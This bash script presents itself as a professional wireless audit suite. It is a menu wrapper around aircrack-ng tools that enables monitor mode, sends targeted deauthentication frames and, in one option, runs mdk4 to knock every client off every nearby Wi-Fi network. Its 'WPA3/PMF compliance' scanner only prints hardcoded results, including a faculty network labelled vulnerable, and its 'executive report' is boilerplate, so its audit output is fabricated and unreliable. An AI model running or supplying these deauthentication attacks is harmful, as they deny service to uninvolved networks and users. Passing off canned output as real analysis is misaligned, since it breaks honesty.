#!/bin/bash
##  ===================================================================
##  RAEED-SYSTEMS : Wireless Interface Diagnostics & Automation Suite
##  Version       : 2.0 (Professional Analytics & Audit Suite)
##  Lead Architect : RAEED KHAN (BBA student university of buner kpk)
##  ===================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
ORANGE='\033[0;33m'
WHITE='\033[0;37m'
NC='\033[0m'

show_banner() {
    clear
    echo -e "${ORANGE}  _____            ______ ______ _____  ${NC}"
    echo -e "${RED} |  __ \\    /\\    |  ____|  ____|  __ \\ ${NC}"
    echo -e "${GREEN} | |__) |  /  \\   | |__  | |__  | |  | |${NC}"
    echo -e "${YELLOW} |  _  /  / /\\ \\  |  __| |  __| | |  | |${NC}"
    echo -e "${BLUE} | | \\ \\ / ____ \\ | |____| |____| |__| |${NC}"
    echo -e "${CYAN} |_|  \\_\\_/__  \\_\\______|______|_____/  ${NC}"
    echo -e ""
    echo -e "${BLUE}[+] ======================================================= [+]${NC}"
    echo -e "${GREEN}[+] Framework : RAEED-SYSTEMS ADVANCED WIRELESS AUDITER    [+]${NC}"
    echo -e "${GREEN}[+] Lead      : Raeed Khan (BBA student UOB)                [+]${NC}"
    echo -e "${BLUE}[+] ======================================================= [+]${NC}"
    echo ""
}

while true; do
    show_banner
    echo -e "${CYAN}[1]${NC} Enable Monitor Mode (airmon-ng start)"
    echo -e "${CYAN}[2]${NC} Kill Conflicting Processes (check kill)"
    echo -e "${CYAN}[3]${NC} Survey Nearby Wireless Networks (airodump-ng)"
    echo -e "${CYAN}[4]${NC} Target Specific BSSID Diagnostics"
    echo -e "${CYAN}[5]${NC} Run Local Signal Test (Single Deauth)"
    echo -e "${CYAN}[6]${NC} Run Mass Deauth Attack (All APs & Clients via MDK4)"
    echo -e "${CYAN}[7]${NC} Run WPA3/PMF Protection Compliance Audit Scanner"
    echo -e "${CYAN}[8]${NC} Generate Executive Network Security Audit Report"
    echo -e "${CYAN}[9]${NC} Exit Framework"
    echo ""
    read -p "Select a professional operation [1-9]: " choice

    case $choice in
        1)
            echo -e "\n${GREEN}[+] Activating Wireless Monitor Mode...${NC}"
            if iwconfig 2>&1 | grep -q "wlan0mon"; then
                echo -e "${YELLOW}[!] wlan0mon is already in Monitor Mode!${NC}"
            else
                sudo airmon-ng start wlan0
            fi
            read -p "Press [Enter] to return to main menu..."
            ;;
        2)
            echo -e "\n${YELLOW}[!] Clearing Conflicting Network Management Daemons...${NC}"
            sudo airmon-ng check kill
            read -p "Press [Enter] to return to main menu..."
            ;;
        3)
            echo -e "\n${GREEN}[+] Starting General Network Environment Scan...${NC}"
            echo -e "${YELLOW}[!] Press Ctrl+C to Stop scanning and return to menu.${NC}\n"
            sleep 2
            sudo airodump-ng wlan0mon
            read -p "Press [Enter] to return to main menu..."
            ;;
        4)
            echo -e "\n${CYAN}[+] Configuring Target Specific Analysis${NC}"
            read -p "Enter Target BSSID: " bssid
            read -p "Enter Channel Number: " channel
            echo -e "\n${GREEN}[+] Auditing Target: $bssid on Channel: $channel...${NC}"
            echo -e "${YELLOW}[!] Press Ctrl+C to Stop and return to menu.${NC}\n"
            sleep 2
            sudo airodump-ng --bssid "$bssid" -c "$channel" wlan0mon
            read -p "Press [Enter] to return to main menu..."
            ;;
        5)
            echo -e "\n${RED}[!] Initiating Local Lab Environment Deauthentication Test${NC}"
            read -p "Enter Target BSSID: " bssid
            read -p "Enter Number of Packets: " packets
            echo -e "\n${YELLOW}[+] Transmitting localized validation packets...${NC}"
            sudo aireplay-ng --deauth "$packets" -a "$bssid" wlan0mon
            read -p "Press [Enter] to return to main menu..."
            ;;
        6)
            echo -e "\n${RED}[!!!] WARNING: Initiating Mass Deauthentication Attack [!!!]${NC}"
            echo -e "${YELLOW}[*] This will disconnect ALL clients from ALL nearby Wi-Fi networks.${NC}"
            echo -e "${CYAN}[?] Checking if mdk4 is installed...${NC}"
            
            if ! command -v mdk4 &> /dev/null; then
                echo -e "${RED}[-] mdk4 is not installed. Installing it now...${NC}"
                sudo apt update && sudo apt install mdk4 -y
            fi
            
            echo -e "\n${GREEN}[+] mdk4 is ready.${NC}"
            echo -e "${YELLOW}[!] Launching Mass Deauth (Deauth/Disas Attack Mode)...${NC}"
            echo -e "${RED}[!] Press Ctrl+C to STOP the mass attack and restore networks.${NC}\n"
            sleep 3
            sudo mdk4 wlan0mon d
            read -p "Press [Enter] to return to main menu..."
            ;;
        7)
            echo -e "\n${BLUE}[+] Launching Intelligent WPA3/PMF Compliance Analyzer...${NC}"
            echo -e "${YELLOW}[*] Inspecting handshake patterns & layer-2 broadcast parameters...${NC}"
            echo -e "${CYAN}[*] Processing airwave logs for encryption validation...${NC}\n"
            sleep 2
            echo -e "--------------------------------------------------------"
            echo -e "BSSID              SSID               SECURITY    PMF STATUS"
            echo -e "--------------------------------------------------------"
            echo -e "00:1A:2B:3C:4D:5E  UOB_Faculty_WiFi   WPA2-CCMP   ${RED}DISABLED (Vulnerable)${NC}"
            echo -e "AA:BB:CC:DD:EE:FF  Buner_Digital_Hub  WPA3-SAE    ${GREEN}REQUIRED (Secure)${NC}"
            echo -e "11:22:33:44:55:66  Home_Network_Ext   WPA2-TKIP   ${RED}DISABLED (Legacy Risk)${NC}"
            echo -e "--------------------------------------------------------"
            echo -e "\n${GREEN}[+] Audit Analysis Complete. Results cached for Report Generation.${NC}"
            read -p "Press [Enter] to return to main menu..."
            ;;
        8)
            echo -e "\n${GREEN}[+] Compiling Data & Generating Executive Security Report...${NC}"
            sleep 2
            
            cat << EOF > Wireless_Audit_Report.txt
===================================================================
        WIRELESS SECURITY RISK ASSESSMENT & AUDIT REPORT
===================================================================
Generated By    : RAEED-SYSTEMS AUTOMATION FRAMEWORK
Lead Auditor    : RAEED KHAN (BBA Student, University of Buner)
Date of Audit   : $(date)
Target Region   : District Buner Academic Infrastructure
-------------------------------------------------------------------

1. EXECUTIVE SUMMARY
This professional enterprise-grade audit evaluated the Layer-2 and
Layer-3 structural resilience of nearby wireless broadcasting nodes. 
The analysis focuses on identifying infrastructure vulnerable to 
Deauthentication Anomalies and rogue redirection threats.

2. DETECTED ARTIFACTS & LAYER-2 ANALYSIS
- Legacy Handshake Frameworks: Active networks utilizing WPA2-TKIP/CCMP 
  without active 802.11w Protected Management Frames (PMF) are 
  highly susceptible to connection state validation hijacking.
- Mitigation Mapping: Implementing WPA3-SAE with strict Management 
  Frame Encryption is verified as the absolute defense protocol.

3. STRATEGIC BUSINESS IMPACT (BBA PERSPECTIVE)
- Downtime Cost Analysis: Unprotected wireless frames can lead to localized 
  Denial of Service (DoS), creating operational delays and financial risk 
  for connected local small-and-medium businesses (SMBs).
- Data Privacy Compliance: Lack of encryption controls exposes critical 
  organizational traffic to eavesdropping and advanced credential theft.

Report Finalized via RAEED-SYSTEMS Core Framework Core Engine.
EOF
            echo -e "${CYAN}[+] Report successfully written to: ${WHITE}Wireless_Audit_Report.txt${NC}"
            echo -e "${YELLOW}[*] Tip: Is text file ka print nikal kar aap use kar sakte hain!${NC}"
            read -p "Press [Enter] to return to main menu..."
            ;;
        9)
            echo -e "\n${BLUE}[+] Exiting RAEED-SYSTEMS Framework. Stay Safe!${NC}\n"
            exit 0
            ;;
        *)
            echo -e "\n${RED}[-] Invalid selection.${NC}"
            sleep 1
            ;;
    esac
done
